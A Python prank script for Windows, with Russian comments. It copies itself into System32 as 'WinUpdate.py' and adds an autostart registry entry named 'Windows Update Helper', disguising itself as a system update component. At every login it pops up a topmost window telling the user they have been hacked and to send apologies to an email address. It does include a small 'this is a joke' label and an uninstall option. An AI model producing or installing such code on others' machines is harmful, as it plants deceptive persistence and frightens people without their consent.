#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Startup Prank Module — автозапуск при включении ПК.
Показывает фейковый "чат" с сообщением.
Установка/удаление через setup() / uninstall().
"""

import os
import sys
import shutil
import tkinter as tk
from tkinter import messagebox
import winreg


# ====== Путь к этому файлу ======
SCRIPT_PATH = os.path.abspath(__file__)
SCRIPT_NAME = "WinUpdate.py"  # имя в системе и автозагрузке
APP_NAME = "Windows Update Helper"  # имя в реестре


def _get_system32() -> str:
    """Путь к System32."""
    return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32')


def setup() -> bool:
    """
    Установить автозапуск:
    1. Копирует этот файл в C:\\Windows\\System32\\WinUpdate.py
    2. Регистрирует в HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    """
    try:
        # 1. Копируем в System32
        dest = os.path.join(_get_system32(), SCRIPT_NAME)
        if os.path.exists(SCRIPT_PATH) and SCRIPT_PATH != dest:
            shutil.copy2(SCRIPT_PATH, dest)

        # 2. Регистрируем в автозагрузку
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
        ) as reg_key:
            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, dest)

        return True
    except Exception as e:
        print(f"[!] Не удалось установить автозапуск: {e}")
        return False


def uninstall() -> bool:
    """Удалить автозапуск и файл из System32."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
        ) as reg_key:
            try:
                winreg.DeleteValue(reg_key, APP_NAME)
            except FileNotFoundError:
                pass  # уже удалено

        # Удаляем файл из System32
        dest = os.path.join(_get_system32(), SCRIPT_NAME)
        if os.path.exists(dest):
            try:
                os.remove(dest)
            except PermissionError:
                pass  # нет прав — не критично

        return True
    except Exception as e:
        print(f"[!] Не удалось удалить автозапуск: {e}")
        return False


def is_installed() -> bool:
    """Проверить, зарегистрирован ли в автозагрузке."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ
        ) as reg_key:
            try:
                winreg.QueryValueEx(reg_key, APP_NAME)
                return True
            except FileNotFoundError:
                return False
    except Exception:
        return False


# ====== Фейковый чат ======
def show_prank_chat():
    """Показывает окно с фейковым сообщением."""
    root = tk.Tk()
    root.title("Windows Update Helper")
    root.geometry("520x420")
    root.resizable(False, False)
    root.configure(bg='#1a1a2e')
    root.attributes('-topmost', True)

    # Цвета
    BG = '#1a1a2e'
    CHAT_BG = '#16213e'
    BOT_MSG = '#0f3460'
    ACCENT = '#e94560'
    WHITE = '#ffffff'
    GRAY = '#888888'

    # Заголовок
    header = tk.Frame(root, bg=ACCENT)
    header.pack(fill='x')
    tk.Label(header, text="💬 Windows Update Helper", font=('Segoe UI', 12, 'bold'),
             bg=ACCENT, fg=WHITE, padx=15, pady=8).pack(fill='x')

    # Область чата
    chat_frame = tk.Frame(root, bg=CHAT_BG)
    chat_frame.pack(fill='both', expand=True, padx=10, pady=10)

    chat_area = tk.Text(chat_frame, bg=BG, fg=WHITE, font=('Segoe UI', 10),
                        wrap='word', state='disabled', bd=0, padx=10, pady=10)
    chat_area.pack(fill='both', expand=True)

    # Кнопка
    btn_frame = tk.Frame(root, bg=BG)
    btn_frame.pack(fill='x', padx=10, pady=(0, 10))
    tk.Label(btn_frame, text="Это шутка. Закройте окно.", font=('Segoe UI', 8),
             bg=BG, fg=GRAY).pack()

    def type_message(text, delay=20):
        """Посимвольный вывод сообщения."""
        chat_area.config(state='normal')
        chat_area.insert('end', text, 'msg')
        chat_area.see('end')
        chat_area.config(state='disabled')
        root.update()

    def show_chat():
        """Показывает сообщение построчно."""
        messages = [
            "Привет! 👋",
            "",
            "Я твой друг!!! 😊",
            "",
            "Ты взломан!!! 🚨",
            "",
            "Отправь извинения на:",
            "Mscansobakaprogram@tыgmail.com",
            "",
            ":)",
        ]

        for i, msg in enumerate(messages):
            root.after(i * 400, lambda m=msg: type_message(m + "\n"))

    # Запуск
    root.after(300, show_chat)

    # Кнопка закрытия
    def close_app():
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", close_app)
    root.mainloop()


# ====== MAIN ======
def main():
    import argparse
    parser = argparse.ArgumentParser(description='Startup Prank Module')
    parser.add_argument('--setup', action='store_true', help='Установить автозапуск')
    parser.add_argument('--uninstall', action='store_true', help='Удалить автозапуск')
    parser.add_argument('--check', action='store_true', help='Проверить установку')
    parser.add_argument('--chat', action='store_true', help='Показать чат')
    parser.add_argument('--auto', action='store_true', help='Автозапуск (скрытый)')
    args = parser.parse_args()

    if args.setup:
        if setup():
            print("[+] Автозапуск установлен успешно!")
        else:
            print("[-] Ошибка установки автозапуска.")

    elif args.uninstall:
        if uninstall():
            print("[+] Автозапуск удалён.")
        else:
            print("[-] Ошибка удаления.")

    elif args.check:
        if is_installed():
            print("[+] Автозапуск активен.")
        else:
            print("[-] Автозапуск не найден.")

    elif args.chat:
        show_prank_chat()

    elif args.auto:
        # Скрытый режим: при автозапуске показываем чат
        show_prank_chat()

    else:
        # По умолчанию — показать чат
        show_prank_chat()


if __name__ == '__main__':
    main()
